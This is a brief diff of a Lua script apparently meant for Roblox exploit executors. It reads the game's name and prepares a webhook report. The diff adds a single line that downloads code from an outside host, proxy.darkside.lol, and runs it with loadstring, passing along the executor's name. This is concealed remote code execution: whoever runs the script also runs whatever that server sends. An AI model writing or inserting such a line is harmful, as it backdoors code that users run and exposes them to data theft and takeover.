@@ -16,6 +16,7 @@ pcall(function()
 local mps = game:GetService("MarketplaceService")
 xyzab = mps:GetProductInfo(game.PlaceId).Name
 end)
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()((identifyexecutor() or "(Unknown Executor)"))
 xyzab=xyzab.." via "..(identifyexecutor() or "(Unknown Executor)")
 local msg = ""
 request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
